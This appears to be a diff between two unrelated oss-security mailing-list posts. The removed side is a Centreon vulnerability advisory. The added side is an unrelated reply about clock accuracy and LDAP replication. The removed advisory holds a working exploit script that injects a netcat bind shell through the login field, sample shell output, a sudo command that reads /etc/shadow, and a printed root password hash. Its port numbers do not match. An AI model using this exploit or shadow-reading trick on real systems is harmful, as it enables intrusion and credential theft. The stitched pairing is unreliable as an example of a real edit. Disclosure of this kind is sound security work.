@@ -1,198 +1,37 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/11/28/2
-Message-ID: <547829DD.7070801@sysdream.com>
-Date: Fri, 28 Nov 2014 08:53:01 +0100
-From: Damien Cauquil <d.cauquil@...dream.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/12/22/13
+Message-ID: <alpine.BSF.2.11.1412230500200.87591@aneurin.horsfall.org>
+Date: Tue, 23 Dec 2014 05:18:20 +1100 (EST)
+From: Dave Horsfall <dave@...sfall.org>
 To: oss-security@...ts.openwall.com
-CC: n.chatelain@...dream.com
-Subject: CVE Request: Multiple vulnerabilities in Centreon <= 2.5.3
+Subject: Re: can we talk about secure time?
 Content-Type: text/plain; charset=utf-8
 
-We found two vulnerabilities in Centreon <= 2.5.3:
+On Mon, 22 Dec 2014, Hanno Böck wrote:
 
-1. Unauthenticated remote command execution
+> I perfectly understand that some people need more accuracy than tlsdate 
+> can give. However it's probably rare, right? I don't see any reason why 
+> average consumer hardware (Desktop, smartphone etc.) would have any 
+> problem with the 1-2 sec max inaccuracy of tlsdate.
 
-This vulnerability allows an unauthenticated user to execute arbitrary
-commands on the remote system.
+Speaking as one who had to feed and water an OpenLDAP system that was 
+replicating all over the world, I really cared whether *this* event 
+happened before or after *that* event, but yeah, most users don't need to 
+do that.
 
-2. Information disclosure (local)
+You haven't lived until you've debugged a replication problem; "Boss, are 
+both these systems running NTP?"  "Yes, Dave."  "Right, in that case, I've 
+found another obscure bug in OpenLDAP."  When you've got more than one 
+person updating the same object at around the same time, it was really 
+helpful, in an LDAP sense, to know the precise order of events, as the 
+whole concept of replication depends upon it.
 
-A specific command-line utility allows local users to escalate
-privileges and retrieve sensitive files on the system, such as
-/etc/shadow. This vulnerability provides a root user access on files
-(read only).
+I suspect that we humans, the geekier we become, the more precise are our 
+perceived needs; just listen to any time announcement over the telephone: 
+"At the third stroke, it will be six o'clock precisely" (with the precise 
+bit happening at the start of the third beep, and I was fanatic over 
+that).
 
-Vendor was notified and fixed the vulnerabilities.
-
-List of related commits:
-
-*
-https://forge.centreon.com/projects/centreon/repository/revisions/015e875482d7ff6016edcca27bffe765c2bd77c1
-*
-https://forge.centreon.com/projects/centreon/repository/revisions/d00f3e015d6cf64e45822629b00068116e90ae4d
-*
-https://forge.centreon.com/projects/centreon/repository/revisions/a6dd914418dd185a698050349e05f10438fde2a9
-
-
-Our security advisory follows. We would like to request 2 CVEs for these
-vulnerabilities.
-
-
-==================================================================
-Unauthenticated Remote Command Execution in Centreon Web Interface
-==================================================================
-
-
-Description
-===========
-
-A critical vulnerability has been found in the Centreon logging class
-allowing remote users to execute arbitrary commands.
-
-
-SQL injection
-=============
-
-Centreon logs SQL database errors in a log file using the "echo" system
-command and the exec() PHP function. On the authentification class,
-Centreon use htmlentities with the ENT_QUOTES options to filter SQL
-entities.
-However, Centreon doesn't filter the SQL escape character "\" and it is
-possible to generate an SQL Error.
-Because of the use of the "echo" system command with the PHP exec()
-function, and because of the lack of sanitization, it is possible to
-inject arbitrary system commands.
-
-**Access Vector**: remote
-
-**Security Risk**: high
-
-----------------
-Proof of Concept
-----------------
-
-TCP BindShell using netcat.
-
-#!/usr/bin/env python
-import requests
-import argparse
-
-def shell(target, bindport):
-    print "[~] Starting bindshell on : %s - port : %d" % (target, bindport)
-    req = requests.post(target, data={"useralias": "$(nc -lvp %d -e
-/bin/sh)\\" % bindport, "password": "foo"})
-    print("[+] Bye !")
-
-if __name__ == "__main__":
-    print "[~] Centreon Unauthentificated RCE - Nicolas Chatelain
-<n.chatelain@...dream.com>"
-    parser = argparse.ArgumentParser()
-    parser.add_argument("--target", required=True)
-    parser.add_argument("--bindport", required=True, type=int)
-    args = parser.parse_args()
-    shell(args.target, args.bindport)
-
-
-nightlydev@...rkstation ~/Lab/Centreon $ python centreon-shell.py
---target=http://172.16.138.130/centreon/index.php --bindport 7777
-[~] Centreon Unauthentificated RCE - Nicolas Chatelain
-<n.chatelain@...dream.com>
-[~] Starting bindshell on : http://172.16.138.130/centreon/index.php -
-port : 7777
-
-# Other term
-
-nightlydev@...rkstation ~/Lab/Centreon $ nc 172.16.138.130 8888
-whoami
-apache
-groups
-apache centreon-engine centreon-broker centreon nagios
-
-
----------------
-Vulnerable code
----------------
-
-The vulnerable code is located in class/centreonLog.class.php, line 82
-and line 154:
-
-.. code-block:: php
-
-		/*
-		 * print Error in log file.
-		 */
-		exec("echo \"".$string."\" >> ".$this->errorType[$id]);
-
-In class/centreonAuth.class.php, line 227:
-
-.. code-block:: php
-
-	 $DBRESULT = $this->pearDB->query("SELECT * FROM `contact` WHERE
-`contact_alias` = '" . htmlentities($username, ENT_QUOTES, "UTF-8") . "'
-AND `contact_activate` = '1' AND 		 `contact_register` = '1' LIMIT 1");
-
-
---------
-Solution
---------
-
-Use the fopen, fwrite and fclose functions to write log data.
-
-
-Possible root password disclosure in centengine (Centreon Entreprise Server)
-============================================================================
-
-In some configurations, when centengine can run as root (with sudo).
-It's possible to read some file content.
-
-**Access Vector**: local
-
-**Security Risk**: high
-
-----------------
-Proof of Concept
-----------------
-
-$ sudo /usr/sbin/centengine -v /etc/shadow
-[1416391088] reading main config file
-[1416391088] error while processing a config file: [/etc/shadow:1] bad
-variable name:
-'root:$6$3mvvEHQM3p3afuh4$DZ377daOy.8bn42t7ur82/Geplvsj90J7cs1xsgAbRZ0JDZ8KdB5CcQ0ucF5dwKpnBYLon1XBqjJPqpm6Zr5R0:16392:0:99999:7:::'
-[1416391088]
-
----------------
-Vulnerable code
----------------
-
-In Centreon Entreprise Server (CES) : /etc/sudoers.d/centreon
-
-CENTREON   ALL = NOPASSWD: /usr/sbin/centengine -v *
-
---------
-Solution
---------
-
-Do not allow centengine to be run as root or do not disclose the line
-that caused the error.
-
-Affected versions
-=================
-
-* Centreon <= 2.5.3
-
-
-Credits
-=======
-
-* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)
-
-Contact
-=======
-
-* Website: http://www.sysdream.com
-* Twitter: @sysdream
-
-
-Regards,
-
-Damien Cauquil
+-- 
+Dave Horsfall DTM (VK2KFU)  "Bliss is a MacBook with a FreeBSD server."
+http://www.horsfall.org/spam.html (and check the home page whilst you're there)
